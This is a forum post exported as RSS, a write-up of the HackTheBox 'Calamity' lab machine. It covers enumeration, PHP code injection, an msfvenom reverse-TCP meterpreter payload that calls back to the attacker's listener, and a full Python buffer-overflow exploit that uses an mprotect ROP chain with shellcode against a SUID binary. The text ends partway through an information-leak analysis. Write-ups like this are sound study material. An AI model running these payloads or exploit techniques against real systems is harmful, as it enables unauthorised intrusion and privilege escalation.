<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>HTB Calamity write-up (ret2mprotect, bypass nx, info leak)</title>
    <link>https://0x00sec.org/t/htb-calamity-write-up-ret2mprotect-bypass-nx-info-leak/5139</link>
    <description>This is my write-up for the [Calamity](https://www.hackthebox.eu/home/machines/profile/37) machine provided by [HackTheBox](https://www.hackthebox.eu) and created by [forGP](https://www.hackthebox.eu/home/users/profile/198).

To get root you are required to write a custom exploit that re-enables data execution on the stack and to know how to dance around in memory like a boss. I&#39;m still a little hazy on some parts so if there are any inaccuracies in the stack breakdown, please correct me so I can learn more :slight_smile: 

This was my favorite machine on HackTheBox I&#39;ll be breaking the post up into three phases:
&gt; [Phase 1 - Enumeration](#enumeration)
&gt; [Phase 2 - Exploitation](#exploitation)
&gt; [Phase 3 - Privilege Escalation](#privilege-escalation)
    &gt;&gt; [Source Code Review](#source-code-review)
    &gt;&gt; [Exploit Development](#exploit-development)
    &gt;&gt;  [Information Leak](#information-leak)
    &gt;&gt; [Assembling The Pieces](#assembling-the-pieces)

Shall we take a trip down memory lane? :eyes:

&lt;a name=&quot;enumeration&quot;&gt;&lt;/a&gt;
## Phase 1 - Enumeration
First and foremost lets run a basic ```nmap``` scan and see what we are working with

```bash
➜  ~ nmap -A --open -R -T4 --max-retries 3 --min-rate 120 --max-rtt-timeout 300ms -Pn 10.10.10.27

Starting Nmap 7.60 ( https://nmap.org ) at 2018-01-15 19:37 EST
Nmap scan report for 10.10.10.27
Host is up (0.12s latency).
Not shown: 794 closed ports, 204 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:46:31:9c:b5:71:c5:96:91:7d:e4:63:16:f9:59:a2 (RSA)
|   256 10:c4:09:b9:48:f1:8c:45:26:ca:f6:e1:c2:dc:36:b9 (ECDSA)
|_  256 a8:bf:dd:c0:71:36:a8:2a:1b:ea:3f:ef:66:99:39:75 (EdDSA)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Brotherhood Software
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.80 seconds
```

Let&#39;s check out the ```Apache``` server running on port 80 first, we&#39;ll start by curling the source code.
```bash
➜  ~ curl http://10.10.10.27
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;Brotherhood Software&lt;/title&gt;
&lt;/head&gt;
&lt;body background=&quot;bg.png&quot;&gt;
&lt;center&gt;
&lt;h1 style=&quot;color:red&quot;&gt;Brotherhood Software - writing security related software since 2009&lt;/h1&gt;
&lt;!-- and bad at html and design since forever --&gt;
&lt;div style=&quot;opacity:0.4;&quot;&gt;
&lt;img src=&quot;leet.png&quot;/&gt;
&lt;/div&gt;

&lt;div style=&quot;color:red&quot;&gt;this e-store is under development !Haven&#39;t done much yet because we put a lot of time on our pro-products &lt;!-- liiiieeesss --&gt;^_^ ...but it will soon be operating
&lt;/div&gt;&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
```

Looks like forGP gave us a hint that these guys weren&#39;t very competent developers. This will become clear later.

Let&#39;s do a little dirbusting with ```wfuzz``` and our ```admin-panels.txt``` wordlist.

```bash
➜  ~ wfuzz --hc 404 -w /usr/share/wordlists/wfuzz/general/admin-panels.txt http://10.10.10.27/FUZZ
Target: HTTP://10.10.10.27/FUZZ
Total requests: 137

========================================================================
ID	Response    Lines	Word		Chars		Payload
========================================================================

00001:	C=200	    10 L	25 W		451 Ch		&quot;admin.php&quot;

Total time: 2.725248
Processed Requests: 137
Filtered Requests: 136
Requests/sec.: 50.27065
```

Our wfuzz came back fruitful within seconds, by visitng admin.php we are greeted with the login form. After viewing the source and trying a few SQL Injections and getting no where I decided to curl the page.

```bash
➜  ~ curl http://10.10.10.27/admin.php
&lt;html&gt;&lt;body&gt;

&lt;form method=&quot;post&quot;&gt;
Password: &lt;input type=&quot;text&quot; name=&quot;user&quot;&gt;&lt;br&gt;
Username: &lt;input type=&quot;password&quot; name=&quot;pass&quot;&gt;
  &lt;input type=&quot;submit&quot; value=&quot;Log in to the powerful administrator page&quot;&gt;
&lt;!-- password is:skoupidotenekes--&gt;
&lt;/form&gt; 
&lt;/body&gt;&lt;/html&gt;
```

Here we see the highly skilled developer left the password for his admin panel in an html comment, cleverly hidden away on the far right side of the source code. Not that curl cares. After logging in we have this lovely piece of work

```bash
➜  ~ curl --cookie &quot;adminpowa=noonecares&quot; http://10.10.10.27/admin.php


&lt;html&gt;
&lt;title&gt;GOT U BEEJAY&lt;/title&gt;
&lt;body&gt;
TADAA IT HAS NOTHING
&lt;br&gt;
what were you waiting for dude ?you know I aint finished creating&lt;br&gt;
xalvas,the boss said I am a piece of shit and that I dont take my job seriously...but when all this is set up...Ima ask for double the money&lt;br&gt;
just cauz he insulted me &lt;br&gt;
Maybe he&#39;s still angry at me deleting the DB on the previous site...he should keep backups man ! 
&lt;br&gt;
anyway I made an html interpreter to work on my php skills !

It wasn&#39;t easy I assure you...I&#39;m just a P-R-O on PHP !!!!!!!!!
&lt;br&gt;
access in here is like 99% secure ,but even if that 1% reaches this page ,there&#39;s nothing they can do ! 
&lt;br&gt;
html is super-harmless to our system!
Try writing some simple stuff ...and see how difficult my job is and how underpaid I am



&lt;form method=&quot;get&quot;&gt;
Your HTML: &lt;input type=&quot;text&quot; name=&quot;html&quot;&gt;&lt;br&gt;
  &lt;input type=&quot;submit&quot; value=&quot;SHOW ME DA PAGE&quot;&gt;
&lt;/form&gt; 
&lt;/body&gt;&lt;/html&gt;
```
&lt;a name=&quot;exploitation&quot;&gt;&lt;/a&gt;
## Phase 2 - Exploitation
Reading this message hurt my brain but once I saw &quot;I&#39;m just a P-R-O on PHP&quot; it was time for the most elite remote code execution
*&lt;?php phpinfo(); ?&gt;*

Much to my surprise this worked.

Wasting absolutely no more time I grabbed a meterpreter session using a msfvenom payload.
```bash
➜  ~ msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.15.140 lport=4433 -o test.php
```

```bash
msf &gt; use multi/handler
msf exploit(multi/handler) &gt; set payload php/meterpreter/reverse_tcp
payload =&gt; php/meterpreter/reverse_tcp
msf exploit(multi/handler) &gt; set lhost tun0
lhost =&gt; tun0
msf exploit(multi/handler) &gt; set lport 4433
lport =&gt; 4433
msf exploit(multi/handler) &gt; run

[*] Started reverse TCP handler on 10.10.15.140:4433 
[*] Sending stage (37543 bytes) to 10.10.10.27
[*] Meterpreter session 1 opened (10.10.15.140:4433 -&gt; 10.10.10.27:52006) at 2018-01-15 19:52:23 -0500

meterpreter &gt; getuid
Server username: www-data (33)
```

Now with a shell it was time to poke around the box a bit

```bash
meterpreter &gt; ls /home
Listing: /home
==============

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40755/rwxr-xr-x  4096  dir   2018-01-15 17:34:16 -0500  xalvas

meterpreter &gt; cd /home/xalvas
meterpreter &gt; ls
Listing: /home/xalvas
=====================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
100644/rw-r--r--  220      fil   2017-06-27 19:25:56 -0400  .bash_logout
100644/rw-r--r--  3790     fil   2017-06-27 19:26:45 -0400  .bashrc
40700/rwx------   4096     dir   2017-06-27 19:36:23 -0400  .cache
40750/rwxr-x---   4096     dir   2018-01-15 17:34:16 -0500  .config
100664/rw-rw-r--  43       fil   2017-06-27 18:11:27 -0400  .gdbinit
40775/rwxrwxr-x   4096     dir   2017-06-27 19:24:52 -0400  .nano
100644/rw-r--r--  655      fil   2017-06-27 19:26:07 -0400  .profile
100644/rw-r--r--  0        fil   2017-06-27 13:03:39 -0400  .sudo_as_admin_successful
40755/rwxr-xr-x   4096     dir   2017-06-27 18:01:12 -0400  alarmclocks
40750/rwxr-x---   4096     dir   2017-06-29 14:00:44 -0400  app
100644/rw-r--r--  225      fil   2017-06-27 18:16:26 -0400  dontforget.txt
100644/rw-r--r--  3759     fil   2018-01-15 19:49:28 -0500  intrusions
40775/rwxrwxr-x   4096     dir   2017-06-27 18:09:07 -0400  peda
100644/rw-r--r--  3196724  fil   2017-06-27 18:00:49 -0400  recov.wav
100444/r--r--r--  33       fil   2017-12-24 10:31:11 -0500  user.txt

meterpreter &gt; cat user.txt
0790e7be60d5cd7faeeb9ac550762e5e
```

This is where it gets a little CTF-y briefly, strap in, *sudo apt-get install audacity*, and if you&#39;re like me cry a little at being forced to do steganography.

```bash
meterpreter &gt; download recov.wav
[*] Downloading: recov.wav -&gt; recov.wav
[*] Downloaded 1.00 MiB of 3.05 MiB (32.8%): recov.wav -&gt; recov.wav
[*] Downloaded 2.00 MiB of 3.05 MiB (65.6%): recov.wav -&gt; recov.wav
[*] Downloaded 3.00 MiB of 3.05 MiB (98.4%): recov.wav -&gt; recov.wav
[*] Downloaded 3.05 MiB of 3.05 MiB (100.0%): recov.wav -&gt; recov.wav
[*] download   : recov.wav -&gt; recov.wav
meterpreter &gt; download alarmclocks/rick.wav
[*] Downloading: alarmclocks/rick.wav -&gt; rick.wav
[*] Downloaded 1.00 MiB of 3.05 MiB (32.8%): alarmclocks/rick.wav -&gt; rick.wav
[*] Downloaded 2.00 MiB of 3.05 MiB (65.6%): alarmclocks/rick.wav -&gt; rick.wav
[*] Downloaded 3.00 MiB of 3.05 MiB (98.41%): alarmclocks/rick.wav -&gt; rick.wav
[*] Downloaded 3.05 MiB of 3.05 MiB (100.0%): alarmclocks/rick.wav -&gt; rick.wav
[*] download   : alarmclocks/rick.wav -&gt; rick.wav
```

Load the ```rick.wav``` into audacity, and then import ```recov.wav```

Click on ```rick.wav``` and add an invert effect, now instead of being rick roll&#39;d by ```forGP``` we can hear it read out a password, note that the password starts at the end of the track and continues reading into the beginning.
Your password is 18547936..*

There&#39;s no way it could possibly be the ```ssh``` login!
&lt;a name=&quot;privilege-escalation&quot;&gt;&lt;/a&gt;
## Phase 3 - Privilege Escalation
&gt; But It was the ssh login.

```bash
➜  ~ ssh xalvas@10.10.10.27
xalvas@10.10.10.27s password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-81-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

9 packages can be updated.
8 updates are security updates.


Last login: Mon Jan 15 19:21:45 2018 from 10.10.14.56
xalvas@calamity:~$ 
```

Having a look around we found a binary with the suid bit set without even needing to run the ```find``` command
```bash
xalvas@calamity:~$ ls -la app
total 28
drwxr-x--- 2 root   xalvas  4096 Jun 29  2017 .
drwxr-xr-x 8 xalvas xalvas  4096 Jan 15 17:34 ..
-r-sr-xr-x 1 root   root   12584 Jun 29  2017 goodluck  &lt;-- look ma, suid
-r--r--r-- 1 root   root    3936 Jun 29  2017 src.c
```

Seems as though this is going to be like babytown frollicks! A suid binary *and* the source code?! Let&#39;s examine the source to get an idea as to how to approach this.
&lt;a name=&quot;source-code-review&quot;&gt;&lt;/a&gt;
### Source Code Review
This seems important as it&#39;s creating a buffer of USIZE where data may potentially be user suplied.
```c
#define USIZE 12
#define ISIZE 4

  struct f {
    char user[USIZE];
    //int user;
    int secret;
    int admin;
    int session;
  }
hey;
```

This is allowing for user input in the form of a file to be supplied to the application and as we suspected the file contents are then copied into the previous struct&#39;s user buffer.
```c
void createusername() {
//I think  something&#39;s bad here
unsigned char for_user[ISIZE];

  printf(&quot;\nFilename:  &quot;);

  char fn[30];
  scanf(&quot; %28s&quot;, &amp; fn);

flushit();
  copy(fn, for_user,USIZE);


 strncpy(hey.user,for_user,ISIZE+1);
  hey.user[ISIZE+1]=0;

}
```

Honestly I don&#39;t need to read anything else when you literally tell me this is vulnerable, I&#39;m going to start here.
```c
void debug() {

  printf(&quot;\nthis function is problematic on purpose\n&quot;);
  printf(&quot;\nI&#39;m trying to test some things...and that means get control of the program! \n&quot;);

  char vuln[64];

  printf(&quot;vulnerable pointer is at %x\n&quot;, vuln);
  printf(&quot;memory information on this binary:\n&quot;, vuln);

  printmaps();

  printf(&quot;\nFilename:  &quot;);

  char fn[30];
  scanf(&quot; %28s&quot;, &amp; fn);
  flushit();
  copy(fn,vuln,100);//this shall trigger a buffer overflow

  return;

}
```

But just to be good padawans we have to look a little more, if nothing else just to put it into the back of our mind, we might need it later! This is definitely going to be interesting as it&#39;s a way to gain administrative privileges to the app, however you need to have a ```secret``` and it has to match. There doesn&#39;t appear to be a way to pass the login within the app so we likely will have to pass it through file contents, but we&#39;ll see.
```c
void attempt_login(int shouldbezero, int safety1, int safety2) {

  if (safety2 != safety1) {
    printf(&quot;hackeeerrrr&quot;);
    fflush(stdout);
	exit(666);
  }
  if (shouldbezero == 0) {
    printf(&quot;\naccess denied!\n&quot;);
    fflush(stdout);
  } else debug();

}
```

So here we see how our ```secret``` gets defined, and it is not something we directly seem to control, however we will come back to this later.
```c
int sess= rand();

  struct timeval tv;
  gettimeofday( &amp; tv, NULL);

  int whoopsie=0;
  int protect = tv.tv_usec |0x01010101;//I hate null bytes...still secure !


  hey.secret = protect;
  hey.session = sess;
  hey.admin = 0;


  createusername();

  while (1) {
    char action = print();

    if (action == &#39;1&#39;) {
      //I striped the code for security reasons !

    } else if (action == &#39;2&#39;) {
      printdeb(hey.session);
    } else if (action == &#39;3&#39;) {
      attempt_login(hey.admin, protect, hey.secret);
      //I&#39;m changing the program ! you will never be to log in as admin...
      //I found some bugs that can do us a lot of harm...I&#39;m trying to contain them but I think I&#39;ll have to
      //write it again from scratch !I hope it&#39;s completely harmless now ...
    }

    else if(action==&#39;4&#39;)createusername();
    else if (action == &#39;5&#39;) return;

  }
```
&lt;a name=&quot;exploit-development&quot;&gt;&lt;/a&gt;
### Exploit Development
First lets run the program and then press ctrl+c to examine some basic information peda supplies to us. We can also run ```checksec``` to see what kind of security mechanisms are in place.

```
xalvas@calamity:~/app$ gdb -q goodluck
Reading symbols from goodluck...(no debugging symbols found)...done.
gdb-peda$ r
Starting program: /home/xalvas/app/goodluck 
^C
Program received signal SIGINT, Interrupt.

[----------------------------------registers-----------------------------------]
EAX: 0xfffffdfc 
EBX: 0xbffff5d8 --&gt; 0x1 
ECX: 0xbffff5d8 --&gt; 0x1 
EDX: 0x7fffffff 
ESI: 0xb7ffd940 (0xb7ffd940)
EDI: 0xbffff5d8 --&gt; 0x1 
EBP: 0x0 
ESP: 0xbffff59c --&gt; 0x0 
EIP: 0xb7fdac31 (&lt;__kernel_vsyscall+9&gt;:	pop    ebp)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xb7fdac2b &lt;__kernel_vsyscall+3&gt;:	mov    ebp,esp
   0xb7fdac2d &lt;__kernel_vsyscall+5&gt;:	sysenter 
   0xb7fdac2f &lt;__kernel_vsyscall+7&gt;:	int    0x80
=&gt; 0xb7fdac31 &lt;__kernel_vsyscall+9&gt;:	pop    ebp
   0xb7fdac32 &lt;__kernel_vsyscall+10&gt;:	pop    edx
   0xb7fdac33 &lt;__kernel_vsyscall+11&gt;:	pop    ecx
   0xb7fdac34 &lt;__kernel_vsyscall+12&gt;:	ret    
   0xb7fdac35:	retf   0xfffa
[------------------------------------stack-------------------------------------]
0000| 0xbffff59c --&gt; 0x0 
0004| 0xbffff5a0 --&gt; 0x7fffffff 
0008| 0xbffff5a4 --&gt; 0xbffff5d8 --&gt; 0x1 
0012| 0xbffff5a8 --&gt; 0xb7eca3a0 (&lt;__nanosleep_nocancel+22&gt;:	mov    ebx,edx)
0016| 0xbffff5ac --&gt; 0xb7eca2fd (&lt;__sleep+109&gt;:	add    esp,0x10)
0020| 0xbffff5b0 --&gt; 0xbffff5d8 --&gt; 0x1 
0024| 0xbffff5b4 --&gt; 0xbffff5d8 --&gt; 0x1 
0028| 0xbffff5b8 --&gt; 0xc2 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGINT
0xb7fdac31 in __kernel_vsyscall ()
```

```bash
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : Partial

```

Here we can see some interesting bits. First we notice that NX is enabled, this means that data execution will be disabled in the context of the stack. So even if we are able to overwrite memory, or even the Instruction Pointer we will be unable to execute shellcode unless we can find a way to re-enable data execution on the stack. Interestingly, peda returned to us a ```pop pop pop ret``` rop chain which starts at ```0xb7fdac31```.

Next let&#39;s hop into the debug menu we learned about earlier and see what&#39;s what with ```jump debug```

```
gdb-peda$ jump debug
Continuing at 0x80000c15.

this function is problematic on purpose

I&#39;m trying to test some things...and that means get control of the program! 
vulnerable pointer is at bfffee48
memory information on this binary:

80000000-80002000 r-xp 00000000 08:01 404837     /home/xalvas/app/goodluck
80002000-80003000 r--p 00001000 08:01 404837     /home/xalvas/app/goodluck
80003000-80004000 rw-p 00002000 08:01 404837     /home/xalvas/app/goodluck
80004000-80025000 rw-p 00000000 00:00 0          [heap]
b7e1a000-b7e54000 r-xp 00000000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7e54000-b7e55000 r--p 0003a000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7e55000-b7fca000 r-xp 0003b000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7fca000-b7fcc000 r--p 001af000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7fcc000-b7fcd000 rw-p 001b1000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7fcd000-b7fd0000 rw-p 00000000 00:00 0 
b7fd6000-b7fd8000 rw-p 00000000 00:00 0 
b7fd8000-b7fda000 r--p 00000000 00:00 0          [vvar]
b7fda000-b7fdb000 r-xp 00000000 00:00 0          [vdso]
b7fdb000-b7ffd000 r-xp 00000000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
b7ffd000-b7ffe000 rw-p 00000000 00:00 0 
b7ffe000-b7fff000 r--p 00022000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
b7fff000-b8000000 rw-p 00023000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
bfedf000-c0000000 rw-p 00000000 00:00 0          [stack]



Filename:  
```

This provides us with some good information from the memorymaps, namely we learn that the vulnerable pointer is at ```0xbfffee48``` and that the stack is located at ```0xbfedf000-c0000000```

Before we move forward with learning how we can re-enable execution in the context of the stack, lets see what we&#39;re working with

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100 &gt; fuzzfile
```
Load this file into the ```debug``` menu and attempt to view the session id with menu option 2, then examine the crash

```
Stopped reason: SIGSEGV
0x63413563 in ?? ()
```

With this information we can find the exact offset for our exploit
```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x63413563
[*] Exact match at offset 76
```

Now that we have this information we need to figure out how to re-enable execution on the stack, lets start by disassembling main

```bash
gdb-peda$ disas main
Dump of assembler code for function main:
   0x80000d77 &lt;+0&gt;:	lea    ecx,[esp+0x4]
   0x80000d7b &lt;+4&gt;:	and    esp,0xfffffff0
   0x80000d7e &lt;+7&gt;:	push   DWORD PTR [ecx-0x4]
   0x80000d81 &lt;+10&gt;:	push   ebp
   0x80000d82 &lt;+11&gt;:	mov    ebp,esp
   0x80000d84 &lt;+13&gt;:	push   ebx
   0x80000d85 &lt;+14&gt;:	push   ecx
   0x80000d86 &lt;+15&gt;:	sub    esp,0x20
   0x80000d89 &lt;+18&gt;:	call   0x80000820 &lt;__x86.get_pc_thunk.bx&gt;
   0x80000d8e &lt;+23&gt;:	add    ebx,0x2272
   0x80000d94 &lt;+29&gt;:	push   0x1
   0x80000d96 &lt;+31&gt;:	push   0x3add6
   0x80000d9b &lt;+36&gt;:	push   0xb7e1a000
   0x80000da0 &lt;+41&gt;:	call   0xb7efcd50 &lt;mprotect&gt;
   ---trimmed due to length---
```

After researching ```mprotect```, I learned that it can be used to re-enable execution on the stack via the [entry](http://man7.org/linux/man-pages/man2/mprotect.2.html) in the linux manual.

Now ```mprotect``` takes three arguments, hence the ```pop pop pop ret``` ```peda``` returned to us earlier. The first argument is the mapped region of memory, the second is the size of the stack, and the third are the permissions. 

We already know the mapped region from the stack output of the ```debug``` memorymaps and we already know we want to set it to ```0x7``` for executable.

We just need to calculate the size of the stack, I use [this](http://www.csgnetwork.com/hexaddsubcalc.html) tool. By subtracting ```0xbfedf000``` from ```0xc0000000``` we get ```0x121000```

With this information we can build a template for our exploit!

```python
# re-enable execution on the stack
payload += p(0xb7efcd50) # mprotect
payload += p(0xb7fdac31) # ropgadget for pop3ret
payload += p(0xbfedf000) # start of stack
payload += p(0x121000)   # size of stack
payload += p(0x7)        # permissions
payload += p(0xbfffee48) # vulnerable pointer
```

&gt; Note: Never run shellcode if you don&#39;t know what it does.

With this template figured out we can begin building our exploit, but we will need some shellcode to execute, I went with this [entry](http://shell-storm.org/shellcode/files/shellcode-61.php) from ```shell-storm``` as it performs ```setuid(0)``` as well as being able to fit in very limited space being only 28-bytes.

```python
#!/usr/bin/python
import os
import struct

# convert address to little-endian format
def p(arg):
	return struct.pack(&#39;&lt;L&#39;, arg)

# /bin/dash
shellcode = &quot;\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80&quot;
nops = &quot;\x90&quot; * 10

# crash with embedded nopsled into shellcode
payload = nops
payload += shellcode

# padding
payload += &quot;A&quot; * ( 76 - len(shellcode) - len(nops) )

# re-enable execution in stack context
payload += p(0xb7efcd50) # mprotect
payload += p(0xb7fdac31) # ropgadget for pop3ret
payload += p(0xbfedf000) # start of stack
payload += p(0x121000)   # size of stack
payload += p(0x7)        # permissions

payload += p(0xbfffee48) # vulnerable pointer
print payload
```

Now let&#39;s generate our exploit and check out what it looks like in file form

```bash
xalvas@calamity:/tmp/test$ python exploit.py &gt; exploit
xalvas@calamity:/tmp/test$ cat exploit
����������1ۍC�̀1�Qhn/shh//bi�A
                              ��̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP���1������H���
```

Now by loading this into the ```debug``` function we should get a crash. However keep an eye on the vulnerable pointer reported by the ```debug``` function because it will change on each instance of the program, and likely we have crashed it a few times by now 8-)

```bash
gdb-peda$ jump debug
Continuing at 0x80000c15.

this function is problematic on purpose

Im trying to test some things...and that means get control of the program! 
vulnerable pointer is at bfffee48
memory information on this binary:

80000000-80002000 r-xp 00000000 08:01 404837     /home/xalvas/app/goodluck
80002000-80003000 r--p 00001000 08:01 404837     /home/xalvas/app/goodluck
80003000-80004000 rw-p 00002000 08:01 404837     /home/xalvas/app/goodluck
80004000-80025000 rw-p 00000000 00:00 0          [heap]
b7e1a000-b7e54000 r-xp 00000000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7e54000-b7e55000 r--p 0003a000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7e55000-b7fca000 r-xp 0003b000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7fca000-b7fcc000 r--p 001af000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7fcc000-b7fcd000 rw-p 001b1000 08:01 142037     /lib/i386-linux-gnu/libc-2.23.so
b7fcd000-b7fd0000 rw-p 00000000 00:00 0 
b7fd6000-b7fd8000 rw-p 00000000 00:00 0 
b7fd8000-b7fda000 r--p 00000000 00:00 0          [vvar]
b7fda000-b7fdb000 r-xp 00000000 00:00 0          [vdso]
b7fdb000-b7ffd000 r-xp 00000000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
b7ffd000-b7ffe000 rw-p 00000000 00:00 0 
b7ffe000-b7fff000 r--p 00022000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
b7fff000-b8000000 rw-p 00023000 08:01 142016     /lib/i386-linux-gnu/ld-2.23.so
bfedf000-c0000000 rw-p 00000000 00:00 0          [stack]



Filename:  /tmp/test/exploit
process 1680 is executing new program: /bin/dash
$ id
[New process 4492]
process 4492 is executing new program: /usr/bin/id
[Thread debugging using libthread_db enabled]
Using host libthread_db library &quot;/lib/i386-linux-gnu/libthread_db.so.1&quot;.
uid=1000(xalvas) gid=1000(xalvas) groups=1000(xalvas),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
$ [Inferior 2 (process 4492) exited normally]
```

Now we have re-enabled executon on the stack proven by the fact our shellcode ran ```/bin/dash```, however because we have run the program through gdb to get to the ```debug``` menu we are sandboxed as xalvas and not running with the suid bit we saw earlier.
&lt;a name=&quot;information-leak&quot;&gt;&lt;/a&gt;
### Information Leak
The next step will be to find a way to jump into the ```debug``` menu from normal execution.

Initially by trying to access admin we get ```access denied!``` which if you read ```attempt_login``` from the [source code review](#source-code-review) section above that is because its looking for a secret value to match before it will allow you into the debug menu.

So lets start by fuzzing it.

```bash
xalvas@calamity:/tmp/test$ echo &quot;A&quot; &gt; fuzz
```

When we load this file and examine our session id from menu option two we get ```debug info: 0x37f3a5ef```

Without closing the program currently executing in gdb we get the same result until we send it 8 characters which now gives us ```debug info: 0x0```

Interesting, lets try 9: ```debug info: 0x81fffffd```

10, segfault, okay, so now we can try to get an information leak, we need to leak the value from the ```hey``` struct we examined earlier to get the value of the secret that gets passed to ```attempt_login``` to do this we need to look at the disassembly a bit more.

Let&#39;s try to get an understanding of whats going on

```bash
xalvas@calamity:/tmp/test$ echo &quot;AAAABBBBCCCCDDDD&quot; &gt; fuzz
```

If we load this in and try to examine the session id we get a crash but look closely

```bash
[----------------------------------registers-----------------------------------]
EAX: 0x434343ab 
EBX: 0x43434343 (&#39;CCCC&#39;)
ECX: 0xa (&#39;\n&#39;)
EDX: 0xb7fcd87c --&gt; 0x0 
ESI: 0xb7fcc000 --&gt; 0x1b1db0 
EDI: 0xb7fcc000 --&gt; 0x1b1db0 
EBP: 0xbffff638 --&gt; 0x0 
ESP: 0xbffff610 --&gt; 0x1 
EIP: 0x80000e51 (&lt;main+218&gt;:	mov    eax,DWORD PTR [eax+0x14])
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80000e45 &lt;main+206&gt;:	cmp    BYTE PTR [ebp-0x15],0x32
   0x80000e49 &lt;main+210&gt;:	jne    0x80000e62 &lt;main+235&gt;
   0x80000e4b &lt;main+212&gt;:	lea    eax,[ebx+0x68]
=&gt; 0x80000e51 &lt;main+218&gt;:	mov    eax,DWORD PTR [eax+0x14]
   0x80000e54 &lt;main+221&gt;:	sub    esp,0xc
   0x80000e57 &lt;main+224&gt;:	push   eax
   0x80000e58 &lt;main+225&gt;:	call   0x80000be3 &lt;printdeb&gt;
   0x80000e5d &lt;main+230&gt;:	add    esp,0x10
[------------------------------------stack-------------------------------------]
0000| 0xbffff610 --&gt; 0x1 
0004| 0xbffff614 --&gt; 0x80003000 --&gt; 0x2ef4 
0008| 0xbffff618 --&gt; 0x5a5d54f6 
0012| 0xbffff61c --&gt; 0x84c01 
0016| 0xbffff620 --&gt; 0x32000001 
0020| 0xbffff624 --&gt; 0x1094d01 
0024| 0xbffff628 --&gt; 0x0 
0028| 0xbffff62c --&gt; 0x31f9663c 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x80000e51 in main ()
```

What is happening here is ```EBX``` is getting loaded with the value of what we place after the first 8-bytes which in this case is &quot;CCCC&quot;, or ```0x43434343```. We also see that ```EAX``` is getting loaded with something similar, using a calculator you will notice there is a difference of ```0x68``` between both values. One way of moving values around like this is to use a ```lea``` instruction so lets look in memory for a ```lea``` that copies ```EBX+0x68``` to ```EAX``` by disassembling main

```bash
gdb-peda$ disas main
Dump of assembler code for function main:
   0x80000d77 &lt;+0&gt;:	lea    ecx,[esp+0x4]
   0x80000d7b &lt;+4&gt;:	and    esp,0xfffffff0
   0x80000d7e &lt;+7&gt;:	push   DWORD PTR [ecx-0x4]
   0x80000d81 &lt;+10&gt;:	push   ebp
   0x80000d82 &lt;+11&gt;:	mov    ebp,esp
   0x80000d84 &lt;+13&gt;:	push   ebx
   0x80000d85 &lt;+14&gt;:	push   ecx
   0x80000d86 &lt;+15&gt;:	sub    esp,0x20
   ---trimmed due to length---
   0x80000df8 &lt;+129&gt;:	add    esp,0x10
   0x80000dfb &lt;+132&gt;:	mov    DWORD PTR [ebp-0x10],0x0
   0x80000e02 &lt;+139&gt;:	mov    eax,DWORD PTR [ebp-0x1c]
   0x80000e05 &lt;+142&gt;:	or     eax,0x1010101
   0x80000e0a &lt;+147&gt;:	mov    DWORD PTR [ebp-0x14],eax
   0x80000e0d &lt;+150&gt;:	lea    eax,[ebx+0x68]
   ---trimmed due to length---
```

bingo, ```0x80000e0d &lt;+150&gt;:	lea    eax,[ebx+0x68]```

Next lets find where our hey struct lives by searching for it in memory, conveniently we can search for ```AAAAB``` as that is what we used in our fuzzing

```bash
gdb-peda$ searchmem AAAAB
Searching for &#39;AAAAB&#39; in: None ranges
Found 2 results, display max 2 items:
goodluck : 0x80003068 (&quot;AAAAB&quot;)
  [heap] : 0x80004978 (&quot;AAAABBBBCCCCDDDD\n&quot;)
```

So lets start pokin around ```0x80003068```

```bash
gdb-peda$ x/40x 0x80003068
0x80003068 &lt;hey&gt;:	0x41	0x41	0x41	0x41	0x42	0x00	0x00	0x00
